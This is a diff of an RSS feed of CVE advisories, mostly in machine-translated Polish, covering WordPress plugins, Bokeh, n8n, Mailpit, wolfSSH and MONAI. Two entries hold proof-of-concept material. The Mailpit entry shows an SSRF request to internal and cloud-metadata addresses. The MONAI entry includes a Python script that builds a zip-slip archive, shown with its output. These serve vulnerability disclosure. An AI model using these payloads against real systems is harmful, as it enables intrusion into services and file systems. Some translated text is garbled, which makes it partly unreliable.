@@ -1,5 +1,335 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2025-69364</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69364</link><pubDate>Tue, 06 Jan 2026 16:36:42 +0000</pubDate><description>Brakująca luka w autoryzacji w Cloudways Breeze Breeze umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Breeze: od n/a do &lt;= 2.2.21.</description></item><item><title>CVE-2025-69363</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69363</link><pubDate>Tue, 06 Jan 2026 16:36:42 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w responsywnych dodatkach CyberChimps dla Elementor responsywnych dodatkach dla elementuor umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy responsywnych dodatków dla Elementora: od n/a do &lt;= 2.0.8.</description></item><item><title>CVE-2025-69362</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69362</link><pubDate>Tue, 06 Jan 2026 16:36:42 +0000</pubDate><description>Luka w zabezpieczeniach POSIMYTH UiChemy uichemy umożliwiająca przechowywanie danych XSS. Ten problem dotyczy UiChemy: od n/a do &lt;= 4.4.2.</description></item><item><title>CVE-2025-69361</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69361</link><pubDate>Tue, 06 Jan 2026 16:36:42 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w programie PublishPress Post Expirator po wygaśnięciu umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów zabezpieczeń kontroli dostępu. Ten problem dotyczy narzędzia Post Expirator: od n/a do &lt;= 4.9.3.</description></item><item><title>CVE-2025-69360</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69360</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Luka w zabezpieczeniach CodexThemes TheGem Theme Elements (dla WPBakery) thegem-elements umożliwia użycie XSS opartego na DOM. Ten problem dotyczy TheGem Theme Elements (dla WPBakery): od n/a do &lt;= 5.11.0.</description></item><item><title>CVE-2025-69359</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69359</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w WPFunnels Creator LMS Creatorlms umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Creator LMS: od n/a do &lt;= 1.1.12.</description></item><item><title>CVE-2025-69357</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69357</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Luka w zabezpieczeniach programu CodexThemes TheGem Theme Elements (dla Elementora) thegem-elements-elementor umożliwia przechowywanie danych XSS. Ten problem dotyczy elementów TheGem Theme Elements (dla Elementora): od n/a do &lt;= 5.11.0.</description></item><item><title>CVE-2025-69356</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69356</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Niewłaściwa kontrola nazwy pliku dla instrukcji Include/Require w programie PHP („Zdalne dołączanie plików PHP”) w CodexThemes TheGem Theme Elements (dla Elementora) thegem-elements-elementor umożliwia włączenie lokalnego pliku PHP. Ten problem dotyczy TheGem Theme Elements (dla Elementora): od n/a do &lt;= 5.11.0.</description></item><item><title>CVE-2025-69355</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69355</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w Tickera Tickera tickera-event-ticketing-system umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Tickera: od n/a do &lt;= 3.5.6.4.</description></item><item><title>CVE-2025-69354</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69354</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji we wtyczkach BBR Better Business Reviews Better-Business-Reviews umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Better Business Reviews: od n/a do &lt;= 0.1.1.</description></item><item><title>CVE-2025-69353</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69353</link><pubDate>Tue, 06 Jan 2026 16:36:40 +0000</pubDate><description>Brakująca luka w autoryzacji w proxy i amp;Serwer proxy blokujący VPN &amp;amp;Blokada VPN Blokada proxy VPN umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów zabezpieczeń kontroli dostępu. Ten problem dotyczy serwerów proxy i &amp;amp;Blokada VPN: od n/d do &lt;= 3.5.3.</description></item><item><title>CVE-2025-69352</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69352</link><pubDate>Tue, 06 Jan 2026 16:36:40 +0000</pubDate><description>Brakująca luka autoryzacyjna w StellarWP Kalendarz wydarzeń the-events-calendar umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Kalendarza wydarzeń: od n/a do &lt;= 6.15.12.2.</description></item><item><title>CVE-2025-69351</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69351</link><pubDate>Tue, 06 Jan 2026 16:36:40 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowa neutralizacja elementów specjalnych używanych w poleceniu SQL („wstrzyknięcie SQL”) w Shahjahan Jewel Ninja Tables ninja-tables umożliwia ślepy wtrysk SQL. Ten problem dotyczy tabel Ninja: od n/a do &lt;= 5.2.4.</description></item><item><title>CVE-2025-69350</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69350</link><pubDate>Tue, 06 Jan 2026 16:36:40 +0000</pubDate><description>Luka w zabezpieczeniach Themepoints Accordion accordions-wp podczas nieprawidłowej neutralizacji danych wejściowych podczas generowania strony internetowej („skrypty między witrynami”) umożliwia przechowywanie XSS. Ten problem dotyczy Accordion: od n/a do &lt;= 3.0.3.</description></item><item><title>CVE-2025-69349</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69349</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Brakująca luka w zabezpieczeniach w Fahad Mahmood RSS Feed Widget rss-feed-widget umożliwia wykorzystanie nieprawidłowo skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy widgetu kanału RSS: od n/a do &lt;= 3.0.2.</description></item><item><title>CVE-2025-69348</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69348</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Brakująca luka autoryzacyjna w CoolHappy Dodatek odliczający kalendarz wydarzeń umożliwia wykorzystanie nieprawidłowo skonfigurowanych poziomów zabezpieczeń kontroli dostępu. Ten problem dotyczy dodatku odliczającego kalendarz wydarzeń: od n/a do &lt;= 1.4.15.</description></item><item><title>CVE-2025-69346</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69346</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Brakująca luka w autoryzacji w WPCenter AffiliateX AffiliateX umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy AffiliateX: od n/a do &lt;= 1.3.9.3.</description></item><item><title>CVE-2025-69345</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69345</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w BoldGrid Post i Kreatorze stron autorstwa BoldGrid narzędzia do tworzenia postów i stron umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów zabezpieczeń kontroli dostępu. Ten problem dotyczy Postu i Kreatora stron BoldGrid: od n/a do &lt;= 1.27.9.</description></item><item><title>CVE-2025-69342</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69342</link><pubDate>Tue, 06 Jan 2026 16:36:39 +0000</pubDate><description>Niewłaściwa kontrola nazwy pliku dla instrukcji Include/Require w programie PHP („Zdalne dołączanie plików PHP”) w VanKarWai. Calafate Calafate umożliwia włączenie lokalnego pliku PHP. Ten problem dotyczy Calafate: od n/a do &lt;= 1.7.7.</description></item><item><title>CVE-2025-69341</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69341</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Brakująca luka w autoryzacji w BuddhaThemes WeDesignTech Ultimate Booking Addon wedesigntech-ultimate-booking-addon umożliwia wykorzystanie nieprawidłowo skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy WeDesignTech Ultimate Booking Addon: od n/a do &lt;= 1.0.3.</description></item><item><title>CVE-2025-69336</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69336</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w bdthemes Ultimate Store Kit Elementor Addons Ultimate-store-kit umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy dodatków Ultimate Store Kit Elementor Addons: od n/a do &lt;= 2.9.4.</description></item><item><title>CVE-2025-69335</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69335</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Luka w zabezpieczeniach programu Themepoints Team Showcase umożliwiająca przechowywanie danych XSS. Ten problem dotyczy Team Showcase: od n/a do &lt;= 2.9.</description></item><item><title>CVE-2025-69334</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69334</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowa neutralizacja danych wejściowych podczas generowania strony internetowej („Skrypty między witrynami”) w WPFactory Lista życzeń dla WooCommerce umożliwia przechowywanie XSS. Ten problem dotyczy listy życzeń dla WooCommerce: od n/a do &lt;= 3.3.0.</description></item><item><title>CVE-2025-69331</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69331</link><pubDate>Tue, 06 Jan 2026 16:36:38 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w Jeroen Schmit Theatre dla WordPress Theater umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Theatre for WordPress: od n/a do &lt;= 0.19.</description></item><item><title>CVE-2025-69327</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69327</link><pubDate>Tue, 06 Jan 2026 16:36:37 +0000</pubDate><description>Brakująca luka w autoryzacji w magepeopleteam Car Rental Manager car-rental-manager umożliwia wykorzystanie nieprawidłowo skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Car Rental Manager: od n/a do &lt;= 1.0.9.</description></item><item><title>CVE-2026-0640</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0640</link><pubDate>Tue, 06 Jan 2026 15:32:08 +0000</pubDate><description>W Tenda AC23 16.03.07.52 wykryto słabość.Ma to wpływ na funkcję sscanf pliku /goform/PowerSaveSet.Wykonanie manipulacji argumentem Czas może prowadzić do przepełnienia bufora.Atak może zostać przeprowadzony zdalnie.Exploit został udostępniony publicznie i może zostać wykorzystany do ataków.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-21883</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21883</link><pubDate>Tue, 06 Jan 2026 17:53:44 +0000</pubDate><description>Ta luka umożliwia **przejęcie protokołu WebSocket między lokacjami (CSWSH)** wdrożonej instancji serwera Bokeh.
+
+### Zakres
+
+Ta luka dotyczy tylko wdrożonych instancji serwerów Bokeh.Nie ma to wpływu na statyczne dane wyjściowe HTML, samodzielne osadzone wykresy ani użycie notatnika Jupyter.
+
+Ta luka nie zapobiega wymaganiom dotyczącym uwierzytelniania z góry na serwerach Bokeh, które mają wbudowane punkty uwierzytelniania i nie można jej wykorzystać do zapewnienia dostępności serwerów Bokeh wdrożonych w prywatnych, wewnętrznych sieciach poza tymi sieciami.
+
+### Wpływ
+
+Jeśli serwer Bokeh jest skonfigurowany z listą dozwolonych (np. „dashboard.corp”), osoba atakująca może zarejestrować domenę taką jak „dashboard.corp.attacker.com” (lub użyć subdomeny, jeśli ma to zastosowanie) i zwabić ofiarę do jej odwiedzenia.Złośliwa witryna może następnie zainicjować połączenie WebSocket z podatnym na ataki serwerem Bokeh.Ponieważ nagłówek Origin (np. `http://dashboard.corp.attacker.com/`) pasuje do listy dozwolonych zgodnie z błędną logiką, połączenie jest akceptowane.
+
+Po nawiązaniu połączenia osoba atakująca może w imieniu ofiary wchodzić w interakcję z serwerem Bokeh, potencjalnie uzyskując dostęp do wrażliwych danych lub modyfikując wizualizacje.
+
+### Poprawki
+Poprawione w wersjach 3.8.2 i nowszych.
+
+### Obejścia
+
+Żadne
+
+### Opis techniczny
+
+Funkcja `match_host` w `src/bokeh/server/util.py` zawiera błąd polegający na porównywaniu nazw hostów z wzorcami listy dozwolonych.Funkcja wykorzystuje funkcję `zip()` języka Python do jednoczesnej iteracji po częściach nazwy hosta i wzorca.Jednak `zip()` zatrzymuje iterację, gdy wyczerpany zostanie najkrótszy możliwy do iterowania.
+
+Ponieważ kod sprawdza tylko, czy *wzorzec* jest dłuższy niż *host* (linie 232-233), ale nie sprawdza, czy *host* jest dłuższy niż *wzorzec*, host, który **zaczyna** od wzorca (ale ma dodatkowe segmenty) zostanie pomyślnie dopasowany.
+
+Na przykład, jeśli lista dozwolonych jest skonfigurowana na `['[example.com](http://example.com/)']`, funkcja nieprawidłowo sprawdzi dopasowanie `[example.com.bad.com](http://example.com.evil.com/)`:
+1. Części `hosta': `['przykład', 'com', 'zły', 'com']`
+2. Części wzorca: `['przykład', 'com']`
+3. `zip` porównuje `przykład==przykład` (OK) i `com==com` (OK).
+4. Iteracja zostaje zatrzymana, a funkcja zwraca wartość „True”.</description></item><item><title>CVE-2026-21877</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21877</link><pubDate>Tue, 06 Jan 2026 17:48:24 +0000</pubDate><description>### Wpływ
+n8n jest dotknięty luką umożliwiającą uwierzytelnione zdalne wykonanie kodu (RCE).
+
+W pewnych warunkach uwierzytelniony użytkownik może spowodować wykonanie niezaufanego kodu przez usługę n8n.Może to skutkować pełnym naruszeniem bezpieczeństwa instancji, której dotyczy problem.
+
+Dotyczy to zarówno instancji hostowanych samodzielnie, jak i instancji n8n Cloud.
+
+### Poprawki
+Problem został rozwiązany w wersji n8n 1.121.3.
+
+Użytkownikom zaleca się uaktualnienie do tej wersji lub nowszej, aby w pełni usunąć lukę.
+
+### Obejścia
+Jeśli aktualizacja nie jest możliwa od razu, administratorzy mogą zmniejszyć ryzyko, wyłączając węzeł Git i ograniczając dostęp niezaufanym użytkownikom.
+
+### Referencje
+- dokumentacja n8n: [Blokowanie dostępu do węzłów](https://docs.n8n.io/hosting/securing/blocking-nodes/)</description></item><item><title>CVE-2026-21859</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21859</link><pubDate>Tue, 06 Jan 2026 17:44:29 +0000</pubDate><description>## Podsumowanie
+
+W punkcie końcowym `/proxy` Mailpit występuje luka w zabezpieczeniach umożliwiająca fałszowanie żądań po stronie serwera (SSRF), która umożliwia atakującym wysyłanie żądań do wewnętrznych zasobów sieciowych.
+
+
+## Opis
+
+Punkt końcowy `/proxy` umożliwia wysyłanie żądań do wewnętrznych zasobów sieciowych.Chociaż sprawdza schematy `http://` i `https://`, nie blokuje wewnętrznych adresów IP, umożliwiając atakującym dostęp do wewnętrznych usług i interfejsów API.
+
+## Dowód koncepcji
+
+### Podstawowe żądanie SSRF
+```
+POBIERZ /proxy?url=http://127.0.0.1:8025/api/v1/info
+```
+
+Zwraca to wewnętrzne dane API, w tym ścieżkę do bazy danych i statystyki czasu wykonania.
+
+## Ocena wpływu
+
+### 1. Skanowanie sieci wewnętrznej
+Osoba atakująca może sondować i odkrywać usługi wewnętrzne w sieci.
+
+### 2. Ujawnianie informacji
+Dostęp do wewnętrznych danych API, ścieżek baz danych i statystyk wykonawczych.
+
+### 3. Dostęp do treści e-mailem
+Możliwość odczytania wszystkich przechwyconych wiadomości e-mail za pośrednictwem wewnętrznych punktów końcowych API.
+
+### 4. Dostęp do metadanych w chmurze
+W przypadku wdrożenia w środowiskach chmurowych (AWS/GCP/Azure) potencjalny dostęp do usług metadanych instancji (np. `http://169.254.169.254/`).
+
+## Scenariusze ataku
+
+### Scenariusz 1: Narażenie środowiska programistycznego
+Jeśli Mailpit zostanie przypadkowo narażony na kontakt z Internetem, osoby atakujące mogą wykorzystać SSRF w celu uzyskania dostępu do wewnętrznych zasobów i usług programistycznych.
+
+### Scenariusz 2: Informacje o ucieczce z kontenera
+W przypadku wdrożeń kontenerowych SSRF może ujawnić metadane kontenera i konfiguracje usług wewnętrznych.
+
+### Scenariusz 3: Ruch boczny
+W sieciach korporacyjnych SSRF można wykorzystywać do wykrywania usług wewnętrznych i interakcji z nimi, ułatwiając ruch boczny.
+
+## Czynniki łagodzące
+Ta luka jest ograniczona do żądań HTTP GET z minimalną liczbą nagłówków.Ponadto internetowy interfejs użytkownika i API Mailpit powinien być chroniony przez podstawowe uwierzytelnianie po udostępnieniu go w Internecie, co uniemożliwia dostęp do punktu końcowego proxy.
+
+## Zasoby
+
+— [MDN Web Security — ataki SSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/SSRF)
+- [CWE-918: Fałszowanie żądań po stronie serwera](https://cwe.mitre.org/data/definitions/918.html)
+- [Ściągawka dotycząca zapobiegania SSRF OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)</description></item><item><title>CVE-2025-15382</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15382</link><pubDate>Tue, 06 Jan 2026 17:43:44 +0000</pubDate><description>W funkcji wolfSSH_CleanPath() w aplikacji wolfSSH występuje luka w zabezpieczeniach umożliwiająca nadmierny odczyt bufora sterty.Uwierzytelniony zdalny atakujący może wywołać problem poprzez spreparowane wejście ścieżki SCP zawierające sekwencje „/./”, co skutkuje odczytaniem sterty o 1 bajt.</description></item><item><title>CVE-2025-32304</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-32304</link><pubDate>Tue, 06 Jan 2026 17:34:06 +0000</pubDate><description>Niewłaściwa kontrola nazwy pliku dla instrukcji Include/Require w programie PHP („Zdalne dołączanie plików PHP”) w Mojoomla WPCHURCH umożliwia włączenie lokalnego pliku PHP. Ten problem dotyczy WPCHURCH: od n/a do 2.7.0.
+
+CVSS Score: 8.1 (high)</description></item><item><title>CVE-2026-21851</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21851</link><pubDate>Tue, 06 Jan 2026 17:32:52 +0000</pubDate><description>## Summary
+
+A **Path Traversal (Zip Slip)** vulnerability exists in MONAI's `_download_from_ngc_private()` function. The function uses `zipfile.ZipFile.extractall()` without path validation, while other similar download functions in the same codebase properly use the existing `safe_extract_member()` function.
+
+This appears to be an implementation oversight, as safe extraction is already implemented and used elsewhere in MONAI.
+
+**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
+
+---
+
+## Details
+
+### Vulnerable Code Location
+
+**File:** `monai/bundle/scripts.py`  
+**Lines:** 291-292  
+**Function:** `_download_from_ngc_private()`
+
+```python
+# monai/bundle/scripts.py - Lines 284-293
+zip_path = download_path / f"{filename}_v{version}.zip"
+with open(zip_path, "wb") as f:
+    f.write(response.content)
+logger.info(f"Downloading: {zip_path}.")
+if remove_prefix:
+    filename = _remove_ngc_prefix(filename, prefix=remove_prefix)
+extract_path = download_path / f"{filename}"
+with zipfile.ZipFile(zip_path, "r") as z:
+    z.extractall(extract_path)  # &lt;-- No path validation
+    logger.info(f"Writing into directory: {extract_path}.")
+```
+
+### Root Cause
+
+The code calls `z.extractall(extract_path)` directly without validating that archive member paths stay within the extraction directory.
+
+### Safe Code Already Exists
+
+MONAI already has a safe extraction function in `monai/apps/utils.py` (lines 125-154) that properly validates paths:
+
+```python
+def safe_extract_member(member, extract_to):
+    """Securely verify compressed package member paths to prevent path traversal attacks"""
+    # ... path validation logic ...
+    
+    if os.path.isabs(member_path) or ".." in member_path.split(os.sep):
+        raise ValueError(f"Unsafe path detected in archive: {member_path}")
+    
+    # Ensure path stays within extraction root
+    if os.path.commonpath([extract_root, target_real]) != extract_root:
+        raise ValueError(f"Unsafe path: path traversal {member_path}")
+```
+
+### Comparison with Other Download Functions
+
+| Function | File | Uses Safe Extraction? |
+|----------|------|----------------------|
+| `_download_from_github()` | scripts.py:198 | ✅ Yes (via `extractall()` wrapper) |
+| `_download_from_monaihosting()` | scripts.py:205 | ✅ Yes (via `extractall()` wrapper) |
+| `_download_from_bundle_info()` | scripts.py:215 | ✅ Yes (via `extractall()` wrapper) |
+| `_download_from_ngc_private()` | scripts.py:292 | ❌ No (direct `z.extractall()`) |
+
+---
+
+## PoC
+
+### Step 1: Create a Malicious Zip File
+
+```python
+#!/usr/bin/env python3
+"""Create malicious zip with path traversal entries"""
+import zipfile
+import io
+
+def create_malicious_zip(output_path="malicious_bundle.zip"):
+    zip_buffer = io.BytesIO()
+    
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        # Normal bundle file
+        zf.writestr(
+            "monai_test_bundle/configs/metadata.json",
+            '{"name": "test_bundle", "version": "1.0.0"}'
+        )
+        
+        # Path traversal entry
+        zf.writestr(
+            "../../../tmp/escaped_file.txt",
+            "This file was written outside the extraction directory.\n"
+        )
+    
+    with open(output_path, 'wb') as f:
+        f.write(zip_buffer.getvalue())
+    
+    print(f"Created: {output_path}")
+    with zipfile.ZipFile(output_path, 'r') as zf:
+        print("Contents:")
+        for name in zf.namelist():
+            print(f"  - {name}")
+
+if __name__ == "__main__":
+    create_malicious_zip()
+```
+
+**Output:**
+```
+Created: malicious_bundle.zip
+Contents:
+  - monai_test_bundle/configs/metadata.json
+  - ../../../tmp/escaped_file.txt
+```
+
+### Step 2: Demonstrate the Difference
+
+This script shows the difference between the vulnerable pattern (used in `_download_from_ngc_private`) and the safe pattern (used elsewhere in MONAI):
+
+```python
+#!/usr/bin/env python3
+"""Compare vulnerable vs safe extraction"""
+import zipfile
+import tempfile
+import os
+
+def vulnerable_extraction(zip_path, extract_path):
+    """Pattern used in monai/bundle/scripts.py:291-292"""
+    os.makedirs(extract_path, exist_ok=True)
+    with zipfile.ZipFile(zip_path, "r") as z:
+        z.extractall(extract_path)
+    print("[VULNERABLE] Extraction completed without validation")
+
+def safe_extraction(zip_path, extract_path):
+    """Pattern used in monai/apps/utils.py"""
+    os.makedirs(extract_path, exist_ok=True)
+    with zipfile.ZipFile(zip_path, "r") as zf:
+        for member in zf.infolist():
+            member_path = os.path.normpath(member.filename)
+            
+            # Check for path traversal
+            if os.path.isabs(member_path) or ".." in member_path.split(os.sep):
+                print(f"[SAFE] BLOCKED: {member.filename}")
+                continue
+            
+            print(f"[SAFE] Allowed: {member.filename}")
+
+# Run demo
+print("=" * 50)
+print("VULNERABLE PATTERN (scripts.py:291-292)")
+print("=" * 50)
+with tempfile.TemporaryDirectory() as tmpdir:
+    vulnerable_extraction("malicious_bundle.zip", tmpdir)
+    for root, dirs, files in os.walk(tmpdir):
+        for f in files:
+            rel_path = os.path.relpath(os.path.join(root, f), tmpdir)
+            print(f"  Extracted: {rel_path}")
+
+print()
+print("=" * 50)
+print("SAFE PATTERN (apps/utils.py)")
+print("=" * 50)
+with tempfile.TemporaryDirectory() as tmpdir:
+    safe_extraction("malicious_bundle.zip", tmpdir)
+```
+
+**Output:**
+```
+==================================================
+VULNERABLE PATTERN (scripts.py:291-292)
+==================================================
+[VULNERABLE] Extraction completed without validation
+  Extracted: monai_test_bundle/configs/metadata.json
+  Extracted: tmp/escaped_file.txt
+
+==================================================
+SAFE PATTERN (apps/utils.py)
+==================================================
+[SAFE] Allowed: monai_test_bundle/configs/metadata.json
+[SAFE] BLOCKED: ../../../tmp/escaped_file.txt
+```
+
+---
+
+## Impact
+
+### Conditions Required for Exploitation
+
+1. Attacker must control or compromise an NGC private repository
+2. Victim must configure MONAI to download from that repository
+3. Victim must use `source="ngc_private"` parameter
+
+### Potential Impact
+
+If exploited, an attacker could write files outside the intended extraction directory. The actual impact depends on:
+- The permissions of the user running MONAI
+- The target location of the escaped files
+- Python version (newer versions have some built-in path normalization)
+
+### Mitigating Factors
+
+- Requires attacker to control an NGC private repository
+- Modern Python versions (3.12+) have some built-in path normalization
+- The `ngc_private` source is less commonly used than other sources
+
+---
+
+## Recommended Fix
+
+Replace the direct `extractall()` call with MONAI's existing safe extraction:
+
+```diff
+# monai/bundle/scripts.py
+
++ from monai.apps.utils import _extract_zip
+
+def _download_from_ngc_private(...):
+    # ... existing code ...
+    
+    extract_path = download_path / f"{filename}"
+-   with zipfile.ZipFile(zip_path, "r") as z:
+-       z.extractall(extract_path)
+-       logger.info(f"Writing into directory: {extract_path}.")
++   _extract_zip(zip_path, extract_path)
++   logger.info(f"Writing into directory: {extract_path}.")
+```
+
+This aligns `_download_from_ngc_private()` with the other download functions and ensures consistent security across all download sources.
+
+---
+
+## Resources
+
+- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
+- [Snyk: Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
+- [Python zipfile.extractall() Warning](https://docs.python.org/3/library/zipfile.html#zipfile.ZipFile.extractall)</description></item><item><title>CVE-2025-14942</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14942</link><pubDate>Tue, 06 Jan 2026 17:26:30 +0000</pubDate><description>Maszynę wymiany kluczy wolfSSH można manipulować w celu ujawnienia hasła klienta, nakłonienia klienta do przesłania fałszywego podpisu lub nakłonienia klienta do pominięcia uwierzytelnienia użytkownika.Dotyczy to aplikacji klienckich z wersją wolfSSH 1.4.21 i wcześniejszą.Użytkownicy wolfSSH muszą zaktualizować lub zastosować poprawkę i zaleca się aktualizację używanych poświadczeń.Ta poprawka jest również zalecana dla aplikacji serwerowych wolfSSH.Chociaż nie ma żadnych konkretnych ataków na aplikacje serwerowe, występuje ta sama wada.Dziękujemy Ainie Toky Rasoamananie z Valeo i Olivierowi Levillainowi z Telecom SudParis za raport.</description></item><item><title>CVE-2025-69364</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69364</link><pubDate>Tue, 06 Jan 2026 16:36:42 +0000</pubDate><description>Brakująca luka w autoryzacji w Cloudways Breeze Breeze umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Breeze: od n/a do &lt;= 2.2.21.</description></item><item><title>CVE-2025-69363</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69363</link><pubDate>Tue, 06 Jan 2026 16:36:42 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w responsywnych dodatkach CyberChimps dla Elementor responsywnych dodatkach dla elementuor umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy responsywnych dodatków dla Elementora: od n/a do &lt;= 2.0.8.</description></item><item><title>CVE-2025-69362</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69362</link><pubDate>Tue, 06 Jan 2026 16:36:42 +0000</pubDate><description>Luka w zabezpieczeniach POSIMYTH UiChemy uichemy umożliwiająca przechowywanie danych XSS. Ten problem dotyczy UiChemy: od n/a do &lt;= 4.4.2.</description></item><item><title>CVE-2025-69361</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69361</link><pubDate>Tue, 06 Jan 2026 16:36:42 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w programie PublishPress Post Expirator po wygaśnięciu umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów zabezpieczeń kontroli dostępu. Ten problem dotyczy narzędzia Post Expirator: od n/a do &lt;= 4.9.3.</description></item><item><title>CVE-2025-69360</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69360</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Luka w zabezpieczeniach CodexThemes TheGem Theme Elements (dla WPBakery) thegem-elements umożliwia użycie XSS opartego na DOM. Ten problem dotyczy TheGem Theme Elements (dla WPBakery): od n/a do &lt;= 5.11.0.</description></item><item><title>CVE-2025-69359</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69359</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Brakująca luka w zabezpieczeniach autoryzacji w WPFunnels Creator LMS Creatorlms umożliwia wykorzystanie niepoprawnie skonfigurowanych poziomów bezpieczeństwa kontroli dostępu. Ten problem dotyczy Creator LMS: od n/a do &lt;= 1.1.12.</description></item><item><title>CVE-2025-69357</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69357</link><pubDate>Tue, 06 Jan 2026 16:36:41 +0000</pubDate><description>Luka w zabezpieczeniach programu CodexThemes TheGem Theme Elements (dla Elementora) thegem-elements-elementor umożliwia przechowywanie danych XSS. Ten problem dotyczy elementów TheGem Theme Elements (dla Elementora): od n/a do &lt;= 5.11.0.</description></item><item><title>CVE-2025-69356</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69356</link><pubDate>Tue, 06 Jan 